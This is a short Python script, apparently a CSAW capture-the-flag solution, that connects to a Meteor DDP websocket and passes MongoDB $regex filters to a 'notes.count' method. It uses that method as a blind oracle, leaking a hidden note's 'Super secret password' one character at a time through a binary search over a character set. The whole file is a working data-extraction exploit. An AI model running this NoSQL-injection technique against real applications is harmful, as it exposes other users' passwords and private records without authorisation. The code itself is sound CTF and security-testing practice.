import json
import re
from ddp import DDP

d = DDP("ws://web.chal.csaw.io:5000/websocket")

def count(filter):
    res = d.call("notes.count", [filter])
    if res and "result" in res:
        return res["result"]
    return None

# Sorted charset for binary search
CHARS = sorted("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-!@#$%^&*()+=[]:;,.?/ \n\t'\"<>|~`")

def matches(prefix_filter, regex):
    f = {"$and": [prefix_filter, {"body": {"$regex": regex}}]}
    c = count(f)
    return c is not None and c > 0

def extract_from_start(prefix_filter, max_len=300):
    body = ""
    for i in range(max_len):
        # Binary search for the next character
        lo, hi = 0, len(CHARS)
        # Find the smallest char c such that body+c matches
        # We test ranges: does body + [c1-c2] match?
        # Binary search: find the char
        found = None
        lo, hi = 0, len(CHARS) - 1
        # First check if any char matches
        if not matches(prefix_filter, "^" + re.escape(body) + "."):
            break
        # Binary search over sorted chars
        lo, hi = 0, len(CHARS) - 1
        while lo < hi:
            mid = (lo + hi) // 2
            # Test if the char is in CHARS[lo..mid]
            c1 = re.escape(CHARS[lo])
            c2 = re.escape(CHARS[mid])
            # Build a character class
            cls = "[" + "".join(re.escape(c) for c in CHARS[lo:mid+1]) + "]"
            if matches(prefix_filter, "^" + re.escape(body) + cls):
                hi = mid
            else:
                lo = mid + 1
        found = CHARS[lo]
        body += found
        print(repr(body))
    return body

print("=== password notes ===")
pw_filter = {"body": {"$regex": "Super secret password"}}
body = extract_from_start(pw_filter, max_len=300)
print("FINAL password:", repr(body))

d.close()
end_of_edit

